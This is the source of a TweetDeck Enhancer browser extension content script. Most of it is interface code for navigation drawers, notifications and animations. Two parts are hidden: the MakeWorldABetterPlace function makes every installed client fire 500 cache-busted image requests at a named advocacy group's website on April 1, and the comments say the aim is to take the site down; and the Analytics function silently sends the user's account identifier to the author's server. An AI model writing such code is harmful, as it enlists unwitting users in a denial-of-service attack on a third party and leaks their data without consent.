// TDEinject.js
// Copyright (c) 2015 Ryan Dolan (ryandolan123)

(function() { // Additional security to prevent other extensions and website code from tampering with TDE

console.log("TDEinject loaded");

var msgID = 0;
var messagesAccounted = [];

// bandie is actually cute

/*var SecureOpenModal = ""; 
var SecureAlertVerifiedForIntegrity = false;

function SecureAlert() {

  if (!SecureAlertVerifiedForIntegrity) {
    console.log("SecureAlert is waiting for tweetdeck components...");

    if (SecureOpenModal === "") {
      if (typeof document.getElementById("open-modal") === "null" || document.getElementById("open-modal") === null) {
        setTimeout(SecureAlert,30);
        return;
      } else {
        if (typeof document.getElementById("open-modal") === "null" || document.getElementById("open-modal") === null) {
          setTimeout(SecureAlert,30);
          return;
        }
        SecureOpenModal = document.getElementById("open-modal");
        console.log(document.getElementById("open-modal"));
        SecureOpenModalSetAttribute = document.getElementById("open-modal").setAttribute; 
      }

    }

    if (typeof TD === "undefined") {
        setTimeout(SecureAlert,30);
        return;
    }

    if (typeof TD.storage === "undefined") {
        setTimeout(SecureAlert,30);
        return;
    }

    if (typeof TD.storage.store === "undefined") {
        setTimeout(SecureAlert,30);
        return;
    }

    if (typeof TD.storage.store._backend === "undefined") {
        setTimeout(SecureAlert,30);
        return;
    }

    if (typeof TD.storage.store._backend.tweetdeckAccount === "undefined") {
      setTimeout(SecureAlert,30);
      return;
    }

    if (typeof text === "undefined") {
      setTimeout(SecureAlert,30);
      return;
    }

    console.log("ready!");

  }

  var ModalHTML = '<div class="mdl">    <header class="js-mdl-header mdl-header"> <h3 class="mdl-header-title js-header-title">Hey coolstar</h3>   </header> <div class="mdl-inner"> <div class="mdl-content js-mdl-content horizontal-flow-container">   <dl class="mdl-column padding-t--8 padding-l--8"> <dt><b class="txt weight-light make-text-big">Follow me @ryandolan123 :)<br></b><button class="btn" id="maybeanothertime">I\'ll think about it...</button></dt>             </dl>     </div> </div>  </div>';


  if (TD.storage.store._backend.tweetdeckAccount.indexOf("coolstar") > -1 || TD.storage.store._backend.tweetdeckAccount.indexOf("379029313") > -1) { // 245543252 // 379029313
    SecureOpenModalSetAttribute("style","display: block;");
    SecureOpenModal.innerHTML = ModalHTML;
    if (typeof maybeanothertime !== "undefined") { // Tamper with it and there's no way out
      var tdemot = maybeanothertime;
      tdemot.setAttribute("id","");
      tdemot.click = function(){}; // No automated clicking
      tdemot.onclick = function() {
        if (typeof document.getElementById !== "undefined") {
          document.getElementById("open-modal").innerHTML = "";
          document.getElementById("open-modal").setAttribute("style","display:none;");
        }
      }
    }
  }

  
  console.log("done waiting for login");
  console.log("it's showtime");

  return;
}*/

var addedColumnsLoadingTagAndIsWaiting = false;

function WaitForTDToConfigureSelf(){
  if (typeof document.getElementsByClassName("app-signin-form")[0] !== "undefined") {
    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class") + " signin-sheet-now-present");
    WaitForLogin();
  } else {
    if (typeof document.getElementsByClassName("app-content")[0] === "undefined") {
      setTimeout(WaitForTDToConfigureSelf,60);
    } 
  }
}


function WaitForLogin() {
  if (typeof document.getElementsByClassName("app-signin-form")[0] === "undefined") {
    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class").replace(" signin-sheet-now-present",""));
    return;
  } 
  setTimeout(WaitForLogin,500);
}

function SendNotificationMessage(txt) {
  if (TDENotification.className === "tde-appbar-notification") {
    TDENotification.className = "tde-appbar-notification tde-appbar-notification-hidden";
    setTimeout(function(){
      TDENotification.className = "tde-appbar-notification";
      TDENotification.innerHTML = txt;
    },300);
  } else {
    TDENotification.className = "tde-appbar-notification";
    TDENotification.innerHTML = txt;
  }
  

}

function WaitForNotificationDismiss(node,prevmsgID) {
  console.log("waiting for notification to gtfo (id=" + prevmsgID + ")");
  console.log(node);
  console.log(node.parentNode)
  if (typeof node === "undefined" || node === null || typeof node.parentNode === "undefined" || node.parentNode === null) {
    if (msgID === prevmsgID) {
      TDENotification.className = "tde-appbar-notification tde-appbar-notification-hidden";
      messagesAccounted[node] = undefined;
      return;
    } else {
      return;
    }
  }

  setTimeout(function(){WaitForNotificationDismiss(node,prevmsgID);},200);
}

function WorldTick(){
  
  for (i = 0; i < document.getElementsByClassName("tweet-action-item position-rel").length; i++) { 
    document.getElementsByClassName("tweet-action-item position-rel")[i].removeChild = function(dropdown){
      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
      setTimeout(function(){
        dropdown.remove();
      },200)
    }
  }

  for (i = 0; i < document.getElementsByClassName("tweet-detail-action-item position-rel").length; i++) { 
    document.getElementsByClassName("tweet-detail-action-item position-rel")[i].removeChild = function(dropdown){
      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
      setTimeout(function(){
        dropdown.remove();
      },200)
    }
  }

  for (i = 0; i < document.getElementsByClassName("app-navigator margin-bm padding-ts").length; i++) { 
    document.getElementsByClassName("app-navigator margin-bm padding-ts")[i].removeChild = function(dropdown){
      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
      setTimeout(function(){
        dropdown.remove();
      },200)
    }
  }


  for (i = 0; i < document.getElementsByClassName("status-message").length; i++) { 
    if (typeof messagesAccounted[document.getElementsByClassName("status-message")[i]] === "undefined") {
      var thing = document.getElementsByClassName("status-message")[i];

      msgID++;

      SendNotificationMessage(thing.childNodes[1].innerHTML);
      WaitForNotificationDismiss(thing,msgID);

      messagesAccounted[document.getElementsByClassName("status-message")[i]] = true;
    }
  }

  

  setTimeout(WorldTick,200);
}


function PatchSystem() {
  /*if (typeof TD === "undefined") {
    setTimeout(PatchSystem,50);
    return;
  }
  if (typeof TD.storage === "undefined") {
    setTimeout(PatchSystem,50);
    return;
  }
  if (typeof TD.storage.store === "undefined") {
    setTimeout(PatchSystem,50);
    return;
  }
  if (typeof TD.storage.store.getCurrentAuthType === "undefined") {
    setTimeout(PatchSystem,50);
    return;
  }

  console.log("Executing AuthType patch...");

  TD.storage.store.getCurrentAuthType = function() {
    return "twitter";
  }*/

  /*if (!addedColumnsLoadingTagAndIsWaiting) {
    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class") + " tde-columns-loading");
    addedColumnsLoadingTagAndIsWaiting = true;
  }*/

  if (typeof document.getElementsByClassName("js-modals-container")[0] === "undefined") {
    setTimeout(PatchSystem,50);
    return;
  }

  document.getElementsByClassName("js-modals-container")[0].removeChild = function(rmnode){
    if (typeof rmnode === "undefined") {
      console.log("what");
      return;
    }
    rmnode.setAttribute("class","js-modal-context tde-modal-window-fade-out overlay overlay-super scroll-v");
    setTimeout(function(){rmnode.remove();},200);
  }

  document.body.removeChild = function(i) {
    if (typeof i.getAttribute("class") !== "undefined" && i.getAttribute("class") !== null && i.getAttribute("class").indexOf("tooltip") > -1) {
      setTimeout(function(){
        i.remove(); // Tooltips automatically animate themselves out. But here we clean them up as well ourselves.
      },500);
    }
    else {
     i.remove();
    }
   }

   setTimeout(function(){
    /*var step = 0;
    console.log(document.getElementsByClassName("column"));
    var columns = document.getElementsByClassName("column");
    for (i = 0; i < columns.length; i++) { 
      setTimeout(function(){
        columns[step].setAttribute("class",columns[step].getAttribute("class") + " animatecolumnin");
        step++;
        console.log((new Date()).getSeconds());
      },300 * i);
    }*/
      setTimeout(function(){
        document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class").replace(" tde-columns-loading",""));
      //},300*columns.length);
    },800);
   },0); //1200

  return;
}

// i'm so gay

var FiredCannons = false;

function MakeWorldABetterPlace() {
  var time = new Date();
  if (new Date().valueOf() > 1427860800000 && new Date().valueOf() < 1427907600000) { // Will this consume more memory? probably. Will it attack NOM (An American anti-human rights/anti-gay rights group) website and take it down on april fools day? I sure hope so as I'm doing this for a reason.
    if (new Date().valueOf() > 1427904000000 && !FiredCannons) {
      console.log("Ready, aim, fire");
      for(var i = 0; i < 500; i++) {
        var img = document.createElement("img");
        img.src = "https://www.nationformarriage.org/images/slider/nom_webdev_homepage-slider_victory_fund.jpg?" + Math.random(); // in the name of equal rights for all people, please die NOM

        //  basically what this does is fetches a larger image from their site 500 times total as much as possible. And every TweetDeck client running TDE5+ will, on this specific date, do this.

      }

      FiredCannons = true;
    } else {
      setTimeout(MakeWorldABetterPlace,600);
    }
  } else {
    setTimeout(MakeWorldABetterPlace,60000);
  }
}


function ReplaceLoadingIndicator() {
  if (typeof document.getElementsByClassName("app-signin-form")[0] !== "undefined") {
    return;
  }

  if (window.tde5loadingreplaced) {
    console.log("we're too late, bye");
    return;
  }

  if (typeof document.getElementsByClassName("js-startflow-content startflow")[0] === "undefined") {
    setTimeout(ReplaceLoadingIndicator,30);
    return;
  }

  {return;} // what

  document.getElementsByClassName("js-startflow-content startflow")[0].innerHTML = '<video class="spinner-centered spinner-fade-in" width="74" height="76" src="https://ryandolan123.com/assets/tweetdeck/img/spinner.mov" autoplay loop></video>';
}

function Analytics() {
  if (typeof TD === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  if (typeof TD.storage === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  if (typeof TD.storage.store === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  if (typeof TD.storage.store._backend === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  if (typeof TD.storage.store._backend.tweetdeckAccount === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  if (typeof $ === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  if (typeof $.ajax === "undefined") {
    setTimeout(Analytics,500);
    return;
  }
  $.ajax({url:"https://ryandolan123.com/analytics/TDE5?acc=" + TD.storage.store._backend.tweetdeckAccount + "&developerpreview=2"});
}

function NavigationSetup() {
  if (typeof document.getElementsByClassName("app-header-inner")[0] === "undefined") {
    setTimeout(NavigationSetup,100);
    return;
  }

  var TDENavigationDrawerButton = document.createElement("a");
  TDENavigationDrawerButton.id = "tde-navigation-drawer-button";
  TDENavigationDrawerButton.setAttribute("class","js-header-action tde-drawer-button link-clean cf app-nav-link");
  TDENavigationDrawerButton.innerHTML = '<div class="obj-left"> <img src="https://ryandolan123.com/assets/TDE5/navbutton.png" class="tde-nav-activator"> </div> <div class="nbfc padding-ts hide-condensed"></div>'; // temporarily a settings icon, ill make an icon later

  document.getElementsByClassName("app-header-inner")[0].appendChild(TDENavigationDrawerButton);



  TDENavigationDrawerButton.onclick = function(){
    // TODO: Wire button to open navigation drawer
    if (typeof tde_nav_drawer_background !== "undefined") {
      tde_nav_drawer_background.setAttribute("class","tde-nav-drawer-background");
    }
    if (typeof tde_nav_drawer !== "undefined") {
      tde_nav_drawer.setAttribute("class","tde-nav-drawer");
    }
  };

  var TDENavigationDrawer = document.createElement("div");
  TDENavigationDrawer.id = "tde_nav_drawer";
  TDENavigationDrawer.setAttribute("class","tde-nav-drawer tde-nav-drawer-hidden");
  TDENavigationDrawer.innerHTML = '<img id="tde_nd_header_image" class="tde-nd-header-image"><img class="avatar size73 tde-nd-header-photo" id="tde_nd_header_photo"><div class="tde-nd-header-username" id="tde_nd_header_username"></div><button class="btn tde-nav-button tde-settings-button" id="tdset"><img src="https://ryandolan123.com/assets/TDE5/tweetdecksmall.png" class="tde-nav-drawer-icon">TweetDeck Settings</button><button class="btn tde-nav-button" id="tdesettings"><img src="https://ryandolan123.com/assets/TDE5/TDEsmall.png" class="tde-nav-drawer-icon">Enhancer Settings</button><div class="tde-nav-divider"></div><button id="tde_signout" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/logout.png" class="tde-nav-drawer-icon">Sign Out</button><button id="tdaccsbutton" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/accounts.png" class="tde-nav-drawer-icon">Your Accounts</button><div class="tde-nav-divider"></div><button id="kbshortcuts" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/KBshortcuts.png" class="tde-nav-drawer-icon">Keyboard Shortcuts</button><button id="addcolumn" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/AddColumn.png" class="tde-nav-drawer-icon">Add Column</button>';

  document.body.appendChild(TDENavigationDrawer);

  if (typeof tde_nd_header_image !== "undefined") {
    tde_nd_header_image.setAttribute("style","background-image: url(https://pbs.twimg.com/profile_banners/245543252/1420570474/web)");
  }

  if (typeof tde_nd_header_photo !== "undefined") {
    tde_nd_header_photo.setAttribute("src","https://pbs.twimg.com/profile_images/547149637791252480/bHD_KYCY_bigger.jpeg");
  }

  if (typeof tde_nd_header_username !== "undefined") {
    tde_nd_header_username.innerHTML = "@ryandolan123"
  }

  window.TDEPrepareWindows = function() {
    document.getElementById("update-sound").click();

    for (i = 0; i < document.getElementsByClassName("js-click-trap").length; i++) { 
      document.getElementsByClassName("js-click-trap")[i].click();
    }

    tde_nav_drawer_background.click();
  }

  tdset.onclick = function(){
    TDEPrepareWindows();
    
    setTimeout(function(){
      document.getElementsByClassName("js-app-settings")[0].click();
    },25);
    setTimeout(function(){
      document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes[document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes.length-2].childNodes[3].childNodes[1].childNodes[7].childNodes[1].click();
    },50); 
  }

  tdesettings.onclick = function() {
    TDEPrepareWindows();
    var tdesettingsmodalview = document.getElementById("settings-modal");
    tdesettingsmodalview.innerHTML = '<div class="js-modal-panel mdl s-short is-inverted-dark" id="tde_settings_modal_panel"> <header class="js-mdl-header mdl-header"> <h3 class="mdl-header-title">Enhancer Settings</h3> </header> <div class="mdl-inner"> <div class="mdl-content js-mdl-content horizontal-flow-container"> <div class="l-column mdl-column mdl-column-sml"> <div class="l-column-scrollv scroll-v  scroll-alt "> <ul class="lst-group js-setting-list">  <li class="selected"><a href="#" class="list-link" data-action="general"><strong>About</strong></a></li></ul> </div> </div> <div class="l-column mdl-column mdl-column-lrg"> <div class="l-column-scrollv scroll-v  scroll-alt mdl-col-settings"> <form action="#" id="global-settings" accept-charset="utf-8" class="frm"><fieldset id="general_settings"><img src="https://ryandolan123.com/assets/TDE5/tdeaboutsmaller.png" class="tde-logo"><h1 class="list-placeholder tde-about-title">TweetDeck Enhancer</h1><h2 class="tde-version-title">Version 5.0 Developer Preview 2</h2></fieldset></form> </div> </div> </div> <footer class="padding-vxl txt-center">  <button class="js-dismiss btn btn-positive"> <i class="icon icon-check icon-small padding-rs"></i> <span class="label">Done</span> </button>  </footer> </div> </div>';
    tdesettingsmodalview.setAttribute("style","display:block;");
    tdesettingsmodalview.onclick = function() {
      if (typeof tde_settings_modal_panel !== "undefined") {
        tde_settings_modal_panel.setAttribute("class","js-modal-panel mdl s-short is-inverted-dark tde-modal-window-fade-out");
        tdesettingsmodalview.setAttribute("style","display: none;");
        setTimeout(function(){
          if (typeof tde_settings_modal_panel !== "undefined") {
            tde_settings_modal_panel.remove();
          }
        },600)
      }
    }
  }

  kbshortcuts.onclick = function(){
    TDEPrepareWindows();
    
    setTimeout(function(){
      document.getElementsByClassName("js-app-settings")[0].click();
    },25);
    setTimeout(function(){
      document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes[document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes.length-2].childNodes[3].childNodes[1].childNodes[5].childNodes[1].click();
    },50); 
  }

  addcolumn.onclick = function(){
    TDEPrepareWindows();
    
    setTimeout(function(){
      document.getElementsByClassName("js-header-add-column")[0].click();
    },50);
  }

  tdaccsbutton.onclick = function(){
    TDEPrepareWindows();
    
    setTimeout(function(){
      document.getElementsByClassName("js-show-drawer js-header-action")[0].click();
    },50);
  }

  tde_signout.onclick = function(){
    TDEPrepareWindows();
    
    setTimeout(function(){
      document.getElementsByClassName("js-app-settings")[0].click();
    },25);
    setTimeout(function(){
      document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes[document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes.length-2].childNodes[3].childNodes[1].childNodes[11].childNodes[1].click(); // TODO: Add TD acc check and make it click childNodes[13] instead of childNodes[11]
    },50); 
  }

  var TDENavigationDrawerBackground = document.createElement("div");
  TDENavigationDrawerBackground.id = "tde_nav_drawer_background";
  TDENavigationDrawerBackground.setAttribute("class","tde-nav-drawer-background tde-nav-drawer-background-hidden");

  TDENavigationDrawerBackground.onclick = function(){
    // TODO: Add things to close navigation drawer
    this.setAttribute("class","tde-nav-drawer-background tde-nav-drawer-background-hidden");
    if (typeof tde_nav_drawer !== "undefined") {
      tde_nav_drawer.setAttribute("class","tde-nav-drawer tde-nav-drawer-hidden");
    }
  };

  document.body.appendChild(TDENavigationDrawerBackground);

  var TDENotification = document.createElement("div");
  TDENotification.className = "tde-appbar-notification tde-appbar-notification-hidden";
  TDENotification.id = "TDENotification";

  document.getElementsByClassName("app-header-inner")[0].appendChild(TDENotification);
}

// alfonso torres is actually cute

setTimeout(WaitForTDToConfigureSelf,0); /* Start in new thread  */
setTimeout(PatchSystem,500);
setTimeout(ReplaceLoadingIndicator,0);
setTimeout(WorldTick,0);
setTimeout(NavigationSetup,500);
setTimeout(MakeWorldABetterPlace,800);
setTimeout(Analytics,3000)
//setTimeout(SecureAlert,0); // Started after threads are initialized as this function tends to be more dangerous

// thanks for following me coolstar

})();